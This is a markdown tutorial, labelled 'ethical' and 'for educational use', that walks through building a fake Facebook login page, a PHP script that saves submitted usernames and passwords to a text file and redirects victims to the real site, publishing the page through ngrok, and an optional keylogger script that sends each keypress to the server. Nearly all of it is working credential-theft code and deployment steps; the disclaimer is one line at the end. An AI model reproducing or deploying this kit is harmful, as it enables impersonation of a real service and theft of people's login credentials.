
# 🎯 Ethical Phishing Page Guide (No XAMPP – Windows + PHP + Ngrok)

> 🧠 By Lucy – For Educational & Lab Use Only

---

## 📁 Folder Structure

```
phishing/
├── login.html       ← Fake login page
├── log.php          ← Logs credentials
├── credentials.txt  ← Auto-created after capture
```

---

## 🔸 Step 1: Create `login.html`

```html
<!DOCTYPE html>
<html>
<head>
  <title>Facebook Login</title>
</head>
<body>
  <h2>Facebook Login</h2>
  <form action="log.php" method="POST">
    <input type="text" name="username" placeholder="Email"><br><br>
    <input type="password" name="password" placeholder="Password"><br><br>
    <button type="submit">Login</button>
  </form>
</body>
</html>
```

---

## 🔸 Step 2: Create `log.php`

```php
<?php
$file = fopen("credentials.txt", "a");
fwrite($file, "User: " . $_POST['username'] . " | Pass: " . $_POST['password'] . "\n");
fclose($file);
header("Location: https://facebook.com"); // Redirect after capture
exit;
?>
```

---

## 🔸 Step 3: Host Locally (Without XAMPP)

### 🪟 For Windows Users

1. Download PHP ZIP from: https://windows.php.net/download/
   - Choose "VS16 x64 Thread Safe"
2. Extract to: `C:\php`
3. Add `C:\php` to **System PATH**:
   - Windows Search > "Environment Variables" > Edit Path > Add `C:\php`
4. Open `cmd`, check PHP:
   ```bash
   php -v
   ```

### 🐧 For Linux Users (Debian/Ubuntu)

```bash
sudo apt update
sudo apt install php php-cli
php -v
```

✅ Done! Now you can host PHP pages.

---

## 🔸 Step 4: Start the Server

```bash
cd path/to/phishing
php -S localhost:8080
```

🌐 Then visit:
```
http://localhost:8080/login.html
```

---

## 🌐 Step 5: Make it Public with Ngrok

📦 Download Ngrok from: https://ngrok.com/download

Then run:

```bash
ngrok http 8080
```

Copy the link it gives:
```
https://random-id.ngrok.io/login.html
```

---

## 🧪 Step 6: Test the Page

1. Open link
2. Submit any data
3. Check `credentials.txt` – captured info will appear

---

## 🔥 Bonus: Add Keylogger (Optional)

```html
<script>
document.onkeypress = function(e) {
  fetch("log.php?key=" + e.key);
}
</script>
```

---

## 🚨 Legal Use Only

> Use only in testing labs like DVWA, TryHackMe, or local environments.  
> Misuse = Illegal and punishable.


## 💻 Made with 💡 by Lucy – Your Hacker Guide
